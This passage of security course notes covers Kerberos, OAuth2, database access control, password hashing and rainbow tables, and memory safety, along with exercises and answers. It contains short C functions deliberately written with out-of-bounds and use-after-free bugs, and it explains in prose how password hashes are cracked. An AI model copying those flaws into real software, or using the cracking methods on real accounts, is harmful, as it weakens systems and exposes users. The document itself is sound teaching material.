<li>verify that it contains the same id c as the ticket</li>
</ul></li>
<li>verifies that the authenticator is fresh</li>
<li>verifies that the same authenticator has not been used in the last
time period</li>
</ul>
<p>Tickets are typically valid for eight hours</p>
<h5 id="kerberos-attacks">Kerberos attacks</h5>
<p>MITM attacks - not possible:</p>
<ul>
<li>the attacker does not know the session keys (Kc, K_c,tgs,
K_c,s)</li>
<li>the attacker does not know the keys K_tgs, Ks used to encrypt the
tickets</li>
<li>the attacker cannot create/modify any ticket or authenticator</li>
</ul>
<p>Replay attack: not possible</p>
<ul>
<li>Attacker cannot replay an old authenticator, only fresh ones are
accepted</li>
<li>Attacker cannot replay fresh authenticators, servers keep a list of
the last authenticators received</li>
</ul>
<h5 id="kerberos-pre-authentication">Kerberos pre-authentication</h5>
<p>Anybody can request a ticket for a user c from AS (they can brute
force the password of session key)</p>
<p>To prevent this, pre-authentication can be used.</p>
<p>Microsoft uses pre-authentication.</p>
<h5 id="kerberos-symmetric-keys">Kerberos symmetric keys</h5>
<p>the security of Kerberos relies on symmetric keys:</p>
<ul>
<li>the password hash of the user(s)</li>
<li>the symmetric keys used to encrypt the tickets
<ul>
<li>between the AS and the TGS(s)</li>
<li>between the TGS and the server(s)</li>
</ul></li>
</ul>
<figure>
<img src="Images/Screenshot%20from%202023-10-10%2017-24-44.png"
alt="Kerberos summary" />
<figcaption aria-hidden="true">Kerberos summary</figcaption>
</figure>
<h3 id="delegated-authentication">Delegated authentication</h3>
<h4 id="oauth2">OAUTH2</h4>
<p>Oauth2 is a protocol used for delegated authentication on the
Internet (Oauth2 providers like Facebook, Google, or Twitter can be used
to authenticate and access other applications)</p>
<h5 id="roles">Roles</h5>
<p>Client - application that wants to use authentication and possibly
access the user’s data</p>
<p>Resource server - server that has user’s data that client wants to
use</p>
<p>Authorization server - sever on whic hthe user authenticates</p>
<p>User - owner of account and resources on resource server</p>
<h6 id="typical-oauth2-flow">Typical Oauth2 flow</h6>
<p>The client and the authentication server have a shared secret</p>
<ul>
<li>the client thus has to register with the authentication server
before being able to offer this service</li>
<li>the secret is used when the client exchanges the
<strong>authentication code</strong> for an <strong>access
token</strong></li>
<li>the authentication code is not sufficient to get access to the
resources</li>
<li>It can only be used by the client and nobody else</li>
</ul>
<p>Oauth can be used by browsers or in apps</p>
<ul>
<li>in an app a redirection for authentication can be either
<ul>
<li>opening a browser within the app (called a webview)
<ul>
<li>not very safe as the app could be spying while you login</li>
</ul></li>
<li>switching to the other app (e.g. facebook) and then back</li>
</ul></li>
</ul>
<h5 id="oauth2-authentication-only">Oauth2 authentication only</h5>
<p>If Oauth is only used for logging in, then the flow can stop after
getting access token and login</p>
<p>Most apps in smartphones do not store your password: they use Oauth2
to reques an access token and use this when you cange your password you
don’t need to type your new password into all your devices</p>
<h3 id="authentication-summary">Authentication summary</h3>
<p>Passwords can go a long way, especially if you use a password
manager</p>
<p>For critical accounts, 2FA significantly raises the bar for attacker
- U2F is secure and user-friendly</p>
<p>Challenge-response protocols authenticate a user without sending the
password - can be vulnerable to MITM, in particular if there is no
mutual authentication</p>
<p>Kerberos uses tickets to authenticate users across a network -
authentication is separated from authorization</p>
<p>Oauth is used to delegate authentication on the internet - it has no
crypto at all, relies on communications being made over TLS</p>
<p>Challenge-response protocols we have seen and Kerberos use symmetric
crypto</p>
<h2 id="exercises-3">Exercises 3</h2>
<p><strong>Exercise 1</strong> Explain what is the most important
principle for access control in IT systems.</p>
<p>The most important principle is the least privilege principle. It
mandates that each subject should only have the minimum set of
privileges required for it to fulfill its function</p>
<p><strong>Exercise 2</strong> What is the difference between ACLs and
capabilities?</p>
<p>ACLs and capabilities both describe discretionary access rights that
subjects have on objects. With ACLs, the rights are attached to the
corresponding objects. Capabilities are rights that are attached to the
corresponding subject (e.g. users or programs)</p>
<p><strong>Exercise 3</strong> Describe an advantage and a disadvantage
of RBAC</p>
<p>RBAC makes it simpler to manage access rights. • It is difficult to
define roles that match the least privileges closely. So you either end
up having many slightly different roles or roles that are too
liberal.</p>
<p><strong>Exercise 4</strong> Linux systems store password hashes and
other information about user accounts in a file called shadow. The file
has the following access rights:</p>
<pre class="shell"><code>$ls -l /etc/shadow&#39;
-rw-r––- 1 root shadow 1359 sep 24 22:13 /etc/shadow</code></pre>
<p>• There is a program called unix_chkpwd that is owned by the user
root and the group shadow. It has the setgid bit set:
<code>-rwxr-sr-x 1 root shadow 38912 fév 14 2019 /usr/sbin/unix_chkpwd</code>
What could be the reason for the setgid to be set?</p>
<p>The program can be run by any user (see the last x in -rwxr-sr-x).
The setgid bit means that even when run by any user, it will run in the
group shadow. This group has the right to read, but not modify, the file
/etc/shadow (see the second r in -rw-r—–). Thus, this program could be
used by any user for operations that only need to read the hashes but
not modify them. For example, it could check a user’s password, which is
exactly what it is used for. Here is a typical list of files with the
setgid bit set on a Linux system.</p>
<pre class="shell"><code>find / -perm /g=s -group shadow -printf &quot;%M %u %g %p\n&quot; 2&gt;/dev/null
root shadow -rwxr-sr-x /usr/bin/chage
root shadow -rwxr-sr-x /usr/bin/expiry
root shadow -rwxr-sr-x /usr/sbin/pam_extrausers_chkpwd
root shadow -rwxr-sr-x /usr/sbin/unix_chkpwd</code></pre>
<p><strong>Exercise 5</strong> When mandatory access control (MAC) is
used to protect the integrity of a system: • Can a subject write to
objects on levels above or below it (write-up or write-down)? Explain. •
Give an example of how an operating system can use MAC to protect its
integrity.</p>
<p>• When protecting integrity, we want to prevent that subjects with
lower integrity levels can write to higher levels. Subjects can not
write to levels above them (no write-up). The goal is to preserve the
integrity of the higher level objects. • Processes that interact with
the internet are assigned a low level of integrity. Only few directories
are assigned to that level. All other directories have higher levels and
can not be accessed by those processes. This is true even if the user
owning the process has DAC rights to write into these directories</p>
<p><strong>Exercise 6</strong> Consider the Universal 2nd Factor (U2F)
authentication system. • Explain why the name of the visited website is
added to the information signed by U2F. • Explain why a U2F second
factor is better than an OATH based one time password (OTP).</p>
<p>• This makes sure that a fake website (e.g. playpal instead of
paypal) can not play man-inthe-middle and ask you to sign a challenge it
got from the original server. • U2F uses signatures made with asymmetric
keys. If the server were to be hacked, the attacker would only find
public keys and could note impersonate the user.</p>
<p><strong>Exercise 7</strong> Is a biometric authentication system with
a false acceptance rate of 0.01% a good system?</p>
<p>The false acceptance rate (FAR) alone does not provide enough
information to judge the quality of a biometric authentication system.
For example, the same system could have a false rejection rate (FRR) of
80%, which would make it quite unusable (Biometric authentication
systems can be judged by their equal error rate (EER) which is reached
when the sensitivity is selected such that FER and FAR are equal.)</p>
<p><strong>Exercise 8</strong> Imagine that an attacker is able to
intercept the service ticket and the encrypted session key delivered by
the TGS to a client. • What are the mechanisms that prevent the attacker
to use this information to obtain access to the service mentioned in the
ticket?</p>
<p>• The main protection is given by the encrypted session key. In order
to obtain the service, the client needs to produce an authenticator when
presenting the ticket. To create this authenticator the session key is
required. The attacker only has the encrypted session key. To decrypt
it, they would need the session key of the previous step (which is the
user’s password hash). • Additionally, the ticket contains the IP
address of the client. The attacker could only use the ticket if they
were also capable of using the client’s IP address.</p>
<p><strong>Exercise 9</strong> Describe an attack that is possible in
Kerberos if no pre-authentication is used. Is this type of attack
completely avoided with pre-authentication?</p>
<p>Without pre-authentication, anybody can ask the AS for a ticket
granting ticket and an encrypted session key. The session key of the TGT
is encrypted with the password hash of the corresponding user. An
attacker can then try to bruteforce the user’s password by trying to
decrypt the session key with the hashes of possible passwords. With
pre-authentication, the user has to prove that they know the password
hash by generating an authenticator in order to receive a TGT. The
attacker can no more ask for some data that will allow them to crack the
password. However, if they are patient, they can wait until a user logs
in and requests a ticket. If they can observe the traffic, they can run
the same attack or try to bruteforce the password from the
authenticator. The attack is still possible, but the window of
opportunity is much smaller.</p>
<p><strong>Exercise 10</strong> When you change your password on the
website of Twitter, you can still access Twitter from you smartphone,
without giving the new password. How is this possible?</p>
<p>Twitter uses Oauth2 to authenticate its users. When you installed
twitter on your phone, you had to give the password that was valid at
that time. The twitter client used Oauth2 with your user username and
password to get an access token. That token is stored in your phone and
gives access to Twitter independently of any password change. If you go
to the “settings and privacy” page of your twitter account you can find
all active tokens on “Apps and sessions”. You can invalidate single
tokens by cliking on “Log out the device shown” for each session.</p>
<h2 id="data-security">Data Security</h2>
<p>Data storage requirements are ubiquitous.</p>
<p>Companies must consider securiyt of data they store - EU idea is to
store only what is needed, US store everything.</p>
<ul>
<li>what are security requirements of DB systems?</li>
<li>what are main attack vectors of DB systems?</li>
<li>what are main protections of DB systems?</li>
</ul>
<p>Biggest Swiss privacy scandal - affair efisch - data stored of the
citizens.</p>
<h3 id="typical-setups">Typical setups</h3>
<p>on premises - internet -&gt; firewall -&gt; web server farm -&gt; DB
in cloud - internet -&gt; cloud server farm with DBs</p>
<h3 id="multitier-architecture">Multitier architecture</h3>
<ol type="1">
<li>presentation tier (UI, web pages, interface)</li>
<li>application tier (logic - aoordinates application, processes,
performs calculations, moves data)</li>
<li>data tier (storing and retrieveing from db or file system)</li>
</ol>
<h3 id="database-access-control">Database access control</h3>
<h4 id="layers">Layers</h4>
<p>Layer - threat</p>
<ul>
<li>Hardware - a thief could take the disk or its backup</li>
<li>OS - the sysadmin can access the files</li>
<li>Database - administrators with privileged accounts they can access
all data</li>
<li>Network - hackers could connect to the DB remotely</li>
<li>Application - ab applicaiton user can access data of other
application users</li>
</ul>
<p>Each layer must have a proper different access control</p>
<h4 id="hardware-access-control">Hardware access control</h4>
<p>if it is a physical machine in a data center - physical protection -
locks, cameras, alarms</p>
<p>if it is a virtual machine in the cloud: cloning the machine is like
stealing the hard disk, so limit the number of people who have the right
to clone, use strong auth for your cloud management console,
e.g. 2FA</p>
<h4 id="os-access-control">OS access control</h4>
<p>Database is run a userspace proces, so it is owned by OS user.</p>
<p>This user is the only one allowed to access the files of the
database. And the data is stored in the directory of that DB, and its
only allowed to be accessed by <em>mysql</em> user, or any root</p>
<h4 id="discretionary-db-access-control">Discretionary DB access
control</h4>
<p>SQL databases use discretionary access control (DAC) to grant access
to objects through privileges.</p>
<p>By default the root or system user has all privileges on all the
objects.</p>
<p>To allow Alice read, modify or write the table or column, we can say
“grant privileges (for columns) ON table to alice@localhost”</p>
<p>This data is stored in another table</p>
<p>There is a possibility to allow granularity at the row level by
defining views: “CREATE VIEW Year_2023 AS SELECT * FROM com402.students
WHERE academic_year=2023”</p>
<p><strong>Role-based DB Access control</strong>- SQL databases support
roles</p>
<p>You can grant several roles to a same user, and they act as
users.</p>
<h4 id="network-access-control">Network access control</h4>
<p>sometimes the applciation tier runs on the same machine as the DB.
(then DB should be configured to listen to connections from
localhost)</p>
<p>In other casesm the application tier runs on a different machine -
accept connections only from machines that should talk to the DB (E.g.
installing a firewall in from of the DB, or using a local firewall on
the DB server, restricting users to certain IP addresses that can access
the DB (“CREATE USER bob@10.2.2.3 …”))</p>
<h4 id="application-access-control">Application access control</h4>
<p>applicaitons usually have their own layer of users and privileges -
they use one or few DB accounts to interact with the DB</p>
<p>an e-banking application has 1K customers and three tables - a
customer table with all customers and their password hashes, an account
table with all accounts and their owners, a transaction table with all
transactions of all accounts.</p>
<p>Access control is handled by the application - it uses the customer
table for authenticaiton. It uses the other two tables to find the
accounts and give permissions.</p>
<p>There could be a user who has access to all tables.</p>
<p>Potential flaws in this design:</p>
<ul>
<li>it does not follow the principle of least privileges</li>
<li>prone to SQL injections</li>
<li>it’s a confidentiality problem - lack of compartmentalization and
separation.</li>
</ul>
<h4 id="example-sql-injection">Example: SQL injection</h4>
<p>An attacker can modify the SQL command by adding a closing the quote
and adding additional command to get other data.</p>
<p>Separate code and data! - use %s for string parameters such that the
statement could not change.</p>
<p>To limit the impact of them use different DB users for different
accesses:</p>
<ul>
<li>one DB user with read access on the customer table (for login)</li>
<li>user with write access on the customer table (for changing the
users’ password)</li>
<li>user with the read access on the account table (customers cannot
change the ownership of accounts)</li>
<li>user with r/w access to the transaction table (For the actual
application)</li>
</ul>
<p>It’s not exactly POLP byt it reduces the impact of SQL injection</p>
<p>In general using the different DB users is an application of the
<strong>defense in depth</strong> principle applicaiton uses a
fine-grained access control DB uses coarse grained If the access control
at the application level fails, the access control reduces the
impact</p>
<h3 id="encrypting-the-data">Encrypting the data</h3>
<p>There are data at rest (hw, db), in use(application), in motion
(network)</p>
<h4 id="encrypting-data-at-rest">Encrypting data at rest</h4>
<p>always encrypt the data before writing to the disk - protects against
theft/copy of the disks, but does not protect against users.</p>
<p>DB can be configured to encrypt data before writing it to files.
(Keys may be stored in local files or obtained from a key server)</p>
<p>Example use case - mobile phones.</p>
<h4 id="encrypting-data-in-motion">Encrypting data in motion</h4>
<p>if not encrypted it could be eavesdropped.</p>
<p>Use TLS, but also use certificate pinning</p>
<h4 id="encrypting-data-in-use-by-the-applicaiton">Encrypting data in
use by the applicaiton</h4>
<p>Solution to protect the data in memory of the DB is to encrypt the
data in the application before storing it into the DB.</p>
<p>The key stays in the application tier -there is no way to decrypt the
data on the DB server.</p>
<p>One way to read the memory is use volatility, cold boot attack.</p>
<p><strong>What could go wrong if the data is encrypted in the
DB</strong>:</p>
<ul>
<li>cannot serach with wildcards,</li>
<li>sort, compare or aggregate data</li>
</ul>
<p>useful only to find exact matches, e.g. high profile information</p>
<h3 id="password-storage">Password storage</h3>
<p>how to store passwords - store hashes.</p>
<p>Microsoft stores Windows passwords as hashes (MD4) Almost all
passwrods of length 8 can be recovered in under a minute</p>
<h4 id="hashing">Hashing</h4>
<p>classing way - use salt and iterations</p>
<ul>
<li>hugely slows down password cracking</li>
<li>simple passwords can still be cracked on specialized hw</li>
</ul>
<p>Modern way - use a memory hard function</p>
<ul>
<li>cracking a pass requires a decent amount of memory</li>
<li>specialized hw with many cores do not have enough power</li>
</ul>
<h5 id="importance-of-salt">Importance of salt</h5>
<p>SMBv1 (Microsoft) does not salt their password. Without salt same
password will result in the same hash.</p>
<ol type="1">
<li>multiple hashes can be cracked at once</li>
<li>hashes can be calculated in advance (aka “rainbow table”) (easy for
8letter passwords)</li>
</ol>
<p>For each user we store a random component to compute the hash</p>
<p>Examples:</p>
<ul>
<li>WPA and WPA2 use the SSID as salt, and 4096 iterations of HMAC-SHA1
<ul>
<li>each test becomes expnsive</li>
<li>only simple passwords can be cracked</li>
</ul></li>
<li>kerberos pre-auth</li>
</ul>
<h5 id="time-memory-trade-off">Time-memory trade-off</h5>
<p>when you double the memory, it is four times faster to invert the
function</p>
<p><span class="math inline">T ~ \frac {N^2} {M^2}</span></p>
<p>Rainbow tables are an optimization of this TMTO</p>
<p>Basic idea - organize hashes in chains</p>
<p>we agree on a set of passwords to crack</p>
<p>we create a reduction function r (collision free function that maps
some hash to some pt): it takes a hash as input and produces a password
from our set.</p>
<p>Then we build chains of hash-reduce, and we keep the first and the
last element of each chain. That is how we can save memory and we pay
for this with more time to crack the passwords</p>
<p>To build this table we create four chains and only store the first
and last elements. Typically, the chains countaine order of 10k of
hashes.</p>
<p>let’s try to crack h6 that was leaked: we check if h6 is a known end
of chain - it is not reduce and hash, find known hash, and loop around
to the possible password.</p>
<p>By storing only the start and end of 4 chains we can crack any of the
10 passwords contained in the chains.</p>
<p>Hellman’s original trande-off becomes a colision problem.</p>
<p>Solution is rainbow tables which has different reduction function
used.</p>
<h4 id="storing-hashes-with-salt-and-iterations">Storing hashes with
salt and iterations</h4>
<p>using salt prevents two issues - cannot crack multiple hashes with a
single hash calculation and cannot calculate the hashes in advance</p>
<p><strong>What cryptographic primitive can we use to combine a salt
with a hash</strong> - concat</p>
<p>Salt is not enough - a simple way of slowing the attacker is to apply
the hash function multiple times (because modern GPUS calculate hundreds
of billions of hashes per second)</p>
<p>Salt standards - <em>password based key derivation function
2</em></p>
<p>used in WiFi WPA, MacOS, Linux, etc.</p>
<h4 id="memory-hard-function-hashin">Memory hard function hashin</h4>
<h5 id="memmory-hard-function">Memmory hard function</h5>
<p>purposefully hard to implement efficiently, it takes a lot of memory
to compute.</p>
<p>Better password hash functions require a certain amout of memory
(e.g. 16MB) - for one operation it’s easy, but to crack is hard because
it is paralelized.</p>
<p>The functions run through many steps and intermediate results are in
memory, each step depends on results from previous steps. If you do not
have enough memory you can still recalculate the results.</p>
<p>Scrypt and Argon2</p>
<p>When implementing password storage:</p>
<ul>
<li>always use salt and make the hash function slow</li>
<li>yescrypt, scrypt, argon2</li>
</ul>
<h4 id="password-storage-in-linux">Password storage in Linux</h4>
<p>most distros switched to yescrypt (memory hard function)</p>
<p>the salt and hash are stored in /etc/shadow</p>
<p>“$y$” is the thype of hash</p>
<h3 id="secure-remote-password-protocol">Secure remote password
protocol</h3>
<p>PAKE allows to verify the password of a remote party, and exchange a
key (e.g. for encryption)</p>
<p>PAKE is similar to Diffie-hellman but uses the symmetric key.</p>
<p>Password cannot be bruteforced because it is in exponents, and it’s
safe from eavesdropper.</p>
<h2 id="exercises-4">Exercises 4</h2>
<p><strong>Exercise 1</strong> Your application uses an SQL database
which stores the names, grades and year of graduation of students. •
What mechanism can you apply to allow user Alice to only read data of
students that graduate in 2025?</p>
<p>You can define a VIEW that only returns lines that contain the
graduation year 2025. Then you can GRANT a privilege to user Alice to
read from this view. (The exact commands are:</p>
<div class="sourceCode" id="cb3"><pre
class="sourceCode sql"><code class="sourceCode sql"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="kw">CREATE</span> <span class="kw">VIEW</span> Year_2025 <span class="kw">AS</span> <span class="kw">SELECT</span> <span class="op">*</span> <span class="kw">FROM</span> com402.students</span>
<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a><span class="kw">WHERE</span> graduation<span class="op">=</span><span class="dv">2025</span>;</span>
<span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a><span class="kw">grant</span> <span class="kw">SELECT</span> <span class="kw">ON</span> Year_2025 <span class="kw">to</span> alice@localhost;</span></code></pre></div>
<p>)</p>
<p><strong>Exercise 2</strong> Consider an application that contains
medical data. For more security, it uses two different tables: one with
the personal data of patients and the other one with their medical
conditions. Three database users are defined:</p>
<ol type="1">
<li>a user that can only read and write the personal data table</li>
<li>a user that can read the personal data and the medical data</li>
<li>a user that can read and write the medical data</li>
</ol>
<p>The first user is used when patients update there personal data. The
second user is used when the patients want to see their medical
information. Finally, the third user is used when a doctor logs in to
update the medical data. • Which part of the application would have to
be vulnerable to SQL injections, to allow a patient to read the medical
information of another patient? • What is a typical way of preventing an
SQL injection?</p>
<p>The part of the application that lets a patient see their medical
data uses a database user that has access to the complete table of
medical information. If this part of the application is vulnerable to
SQL injection, then a patient could modify an SQL request to show other
patients’ medical data. Prepared statements are a typical technique to
avoid SQL injection vulnerabilities</p>
<p><strong>Exercise 3</strong> • Why is transparent data encryption (the
DB encrypts before writing to files) better than an encrypted file
system (the OS encrypts the content of the files)?</p>
<p>In the first case, the data can only be seen by database users that
have sufficient privileges or by administrators of the server than can
dump the memory of the database. In the second case, users of the
operating system that do not have the right to access the database files
can also see the data.</p>
<p><strong>Exercise 4</strong> • Give two reasons why it is important to
salt password hashes.</p>
<p>A different salt per hash forces the attacker to crack each hash
separately. They can not try to crack several hashes with a single hash
calculation. A random salt prevents the attacker from calculating the
hashes in advance.</p>
<p><strong>Exercise 5</strong> You just built a very nice rainbow table
that can crack 99% of 8 letter passwords. Compared to a brute-force
attack, it uses 1,000 times less hash operations to find a password. You
are given a list of ten thousand hashes that need to be cracked. • Is it
going to be faster to crack the passwords with the rainbow table or with
a classical brute-force attack?</p>
<p>Although a rainbow table reduces the effort needed to crack a single
password, it can not crack multiple passwords at a time. You have to
search for the corresponding end of chain of each hash to crack. So
cracking 10,000 passwords will be 10,000 times longer that cracking one
password. If you have been able to build a rainbow table, this means
that the passwords are not salted. Thus, a brute-force attack can hash
all possible passwords only once and search for the corresponding hashes
in the list of 10,000 hashes. So even if brute-force is 1,000 times
slower, it will still be 10 times faster than 10,000 rainbow table
runs.</p>
<p><strong>Exercise 6</strong> • Why calculating a Windows password hash
(based on MD4) is about 200,000 times faster than calculating a Linux
password hash based on SHA512?</p>
<p>SHA512 is indeed more complicated to calculate than MD4 but the main
part of the difference is due to the fact a Linux hash is calculated
with thousands of iterations (typically 5,000). This very efficiently
slows down the cracking process.</p>
<p><strong>Exercise 7</strong> • Why is a graphics card that can
calculate 10,000 hashes in parallel, not efficient for cracking password
hashes like Argon or Scrypt?</p>
<p>These hash functions are memory hard, which means that they need a
certain amount of memory to be calculated efficiently. Although graphics
card have many processing cores, they don’t have enough memory per core
to calculate the hash efficiently.</p>
<h2 id="programming-languages-security">Programming languages
security</h2>
<h3 id="motivation">Motivation</h3>
<p>Rust and safe programming languages. There has been a push to have
more Rust (android, linux etc)</p>
<p>Part of this push if google’s 2/3 security rule:</p>
<ul>
<li>code that processes untrustworthy input</li>
<li>code written in an unsafe language (C/C++)</li>
<li>code without strong sandbox</li>
</ul>
<p>Using a “safe” programming language makes rule unnecessary</p>
<h4 id="consequences-of-memory-safety-vulnerabilities">Consequences of
memory safety vulnerabilities</h4>
<p>Those vulnerabilities that receive highest severity rating, are
mostly memory-safety mvlnerabilities.</p>
<p>~70% of android’s high severity vulnerabilities are of memory
safety.</p>
<p>Android 13 roll-out most of its new code is in memory-safe
language</p>
<p>Morris Worm was an attack on 1M lines of code and it was deemed to be
too expensive to rewrite entire codebase in memory safe language (in
1988). Now it’s several orders of magnitude more code and there are
still problems</p>
<h3 id="type-safety">Type safety</h3>
<p>Type system is a system that assigns a <strong>type</strong> to every
<strong>term</strong> (variable, expression, function)</p>
<p>Type of a <strong>value</strong> specidies which operations can be
applied to Type of a <strong>variable</strong> limits values that it can
be assigned Type of an <strong>expression/function</strong> delimits
values it accepts and can produce</p>
<p><strong>Definition</strong> - Well-typed programs cannot go wrong (a
well-founded program cannot do anything that is not defined to do)</p>
<h4 id="staticdynamic-typing">Static/Dynamic Typing</h4>
<p><strong>Static</strong> type system is checked by the compiler (or
preprocessors) before program executes (C, Java, Go, Rust, OCaml)</p>
<ul>
<li>Type checker uses typing rules to determine type of all terms</li>
<li>Compare inferred types against declared types and operations
performed on values</li>
<li>Mismatch is typing error</li>
</ul>
<p><strong>Dynamic</strong> type system tracks types of objects at
runtime and prevents improper operations from being applied to them
(python, javascript)</p>
<p>Dynamic will expose bugs and crashed during runtime, whereas static
will show them at compile-time.</p>
<p>Advantages of Static:</p>
<ul>
<li>no runtime overhead</li>
<li>find errors before program runs</li>
<li>find all errors</li>
<li>better for building reliable systems and groups of developers</li>
</ul>
<p>Advantages of dynamic:</p>
<ul>
<li>more flexible</li>
<li>fewer type declarations</li>
<li>better for quick and dirty programming</li>
</ul>
<h4 id="declaredinferred-types">Declared/Inferred types</h4>
<p>Originally languages required full type declarations for all
functions and variables, and compilers only infer expression types.</p>
<p>Hindly-Milner type inferece used in Haskell (spread into other
languages)</p>
<h4 id="strictrelaxed">Strict/Relaxed</h4>
<p>Strict typing enforces typing and does not allow program to continue
if the types don’t match.</p>
<p>C is not strict.</p>
<h4 id="why-is-c-type-system-so-uglyflexible">Why is C Type system so
ugly/flexible?</h4>
<p>C was a thin layer over assembly language, designed by talented
programmers for talented programmers. -&gt; Machines were slow, memory
was small</p>
<p>Type system did not constrain programmers or prevent them from using
assembly language tricks.</p>
<p>Clearly successful, but times change - now the correctness and
security are far more important and C’s type system is not helpful.</p>
<h4 id="type-safety-and-security">Type safety and security</h4>
<p>type checking is the only “automatic” bug detection technique in
widespread use.</p>
<ul>
<li>Type system might prevent you from expressing something exactly in
the manner you want</li>
<li>it will not stop you from expressign a computation</li>
<li>Problems found by sound type system are real errors: No false
positives</li>
</ul>
<p>In Java the programmer does not have access to direct memory and only
access to objects and their representations.</p>
<h4 id="type-confusion-bugs-are-exploitable">Type confusion bugs are
exploitable</h4>
<p>Often when objects are being cast, there could be bugs which can be
exploited.</p>
<p>Example - if there is a downcast from an inherited class to a
narrower class. This violates memory safety.</p>
<h3 id="memory-safety">Memory safety</h3>
<p>(is the monkey in the cage or outside?)</p>
<p>Memory safety is an essential programming language property. Code can
only access data within live regions of memory whose pointer is properly
obtained.</p>
<p>In a safe language, runtime safety will inform about memory safety,
in an unsafe language, the program might crash or might have some other
behaviour (it is undefined behaviour).</p>
<p><strong>Definition</strong> - memory safety ensures that only valid
objects are accessed in bounds</p>
<p><strong>Spactil memory safety</strong> - objets are only accessed in
bounds. - after pointer arithmetic, the new pointer still points to the
same object</p>
<p><strong>Temporal memory safety</strong> - only valid objects are
accessed. - the underlying object has not been freed.</p>
<p>These safeties are hard to achieve in systems programming
languages.</p>
<h4 id="memory-corruption">Memory corruption</h4>
<p>Unintended modification of memory location due to missing/faulty
safety check.</p>
<div class="sourceCode" id="cb4"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> vulnerable<span class="op">(</span><span class="dt">int</span> user1<span class="op">,</span> <span class="dt">int</span> <span class="op">*</span>array<span class="op">){</span></span>
<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a>  <span class="co">//missing bound check for user1</span></span>
<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a>  array<span class="op">[</span>user1<span class="op">]</span> <span class="op">=</span> <span class="dv">42</span></span>
<span id="cb4-4"><a href="#cb4-4" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
<h4 id="spatial-memory-safety-error">Spatial memory safety error</h4>
<p>the pointer is updated to point oustide of the valid object the
pointer is used to dereference invalid memory</p>
<p>(if you’re lucky, the program will crash, if unlucky the program will
overwrite some data)</p>
<div class="sourceCode" id="cb5"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> vulnerable<span class="op">(){</span></span>
<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a>  <span class="dt">char</span> buf<span class="op">[</span><span class="dv">12</span><span class="op">];</span></span>
<span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a>  <span class="dt">char</span> <span class="op">*</span>ptr <span class="op">=</span> buf<span class="op">[</span><span class="dv">11</span><span class="op">];</span></span>
<span id="cb5-4"><a href="#cb5-4" aria-hidden="true" tabindex="-1"></a>  <span class="op">*</span>ptr<span class="op">++</span> <span class="op">=</span> <span class="dv">10</span><span class="op">;</span></span>
<span id="cb5-5"><a href="#cb5-5" aria-hidden="true" tabindex="-1"></a>  <span class="op">*</span>ptr <span class="op">=</span> <span class="dv">42</span></span>
<span id="cb5-6"><a href="#cb5-6" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
<h4 id="temporal-memory-safety-error">Temporal memory safety error</h4>
<p>the referenced object is freed and no longer “live” the pointer is
used to dereference invalid memory</p>
<div class="sourceCode" id="cb6"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> vulnerable<span class="op">(){</span></span>
<span id="cb6-2"><a href="#cb6-2" aria-hidden="true" tabindex="-1"></a>    free<span class="op">(</span>buf<span class="op">);</span></span>
<span id="cb6-3"><a href="#cb6-3" aria-hidden="true" tabindex="-1"></a>    buf<span class="op">[</span><span class="dv">12</span><span class="op">]</span> <span class="op">=</span> <span class="dv">42</span><span class="op">;</span></span>
<span id="cb6-4"><a href="#cb6-4" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
<h4 id="implementation">Implementation</h4>
<ul>
<li>Bounds checking
<ul>
<li>check that every indexed memory reference is within array
boudns</li>
<li>compiler optimizations can eliminate some runtime checks</li>
</ul></li>
<li>Lifetime tracking
<ul>
<li>use after free is not allowed</li>
<li>double free is not allowed</li>
<li>memory leakage is bad (but allowed)</li>
</ul></li>
<li>Automated storage reclamation
<ul>
<li>garbage collection</li>
<li>reference counting</li>
<li>smart pointers/borrow checking</li>
</ul></li>
</ul>
<h5 id="bounds-checking">Bounds Checking</h5>
<p>every region of memory has a length associated with it</p>
<p>C’s interior pointers make tracking more complex (Java does not allow
them)</p>
<p>Verify that every memory access in in-bounds</p>
<p>One of the difficulties in C is that you can create internal
pointers.</p>
<p>In a smart compiler no check is necessary every loop iteration since
it can determine that value of i is within array before the loop using
language semantics.</p>
<h5 id="overhead-of-bounds-checking">Overhead of bounds checking</h5>
<p>Overhead for enforcing spatial memory safety for C code is
significant (softbound reported 67% overhead, it is due to a lot of
additional metadata needed to control this and for each memory access
you need to do 2-3 more checks)</p>
<p>Overhead for Java is not nearly as large (it is reported 3-10% on
small benchmarks) and similar was found for Rust. This is because the
size of the object can be stored in the object itself.</p>
<h5 id="automated-storage-reclamation">Automated Storage
reclamation</h5>
<p>reclaim and reuse memory that will not be accessed in future
execution - conservative approximation - reclaim memory when it’s not
reachable</p>
<p>Prevent errors with manual reclamation (malloc/free): double free,
use after free or not freeing.</p>
<p>Many algorithms: refernce counting, garbage collection.</p>
<h5 id="temporal-memory-safety-and-security">Temporal memory safety and
security</h5>
<p>double free is an <strong>integrity</strong> concern - data
structures of the allocator may serve as arbitrary write primitive</p>
<p>Missing free is an <strong>availability</strong> concern - basis for
denial-of-service attack (when memory is used up and program
crashes)</p>
<h5 id="reference-counting">Reference counting</h5>
<p>every block of memory maintains a count of numbers of pointers to it:
1 when block is allocated +1 copying pointer -1 dropping pointer</p>
<p>Conceptually simple but fidgety to implement</p>
<p>Memory freed immediately when last pointer is dropped (count = 0)</p>
<h4 id="garbage-collection-gc">Garbage collection (GC)</h4>
<p>When program is running out of space on heap, stop and run collector
to find uncreachable objects. Pauses program execution Uncollected
garbage increases memory requirements may be less expensive than RC
Collects unreachable cyclic structures.</p>
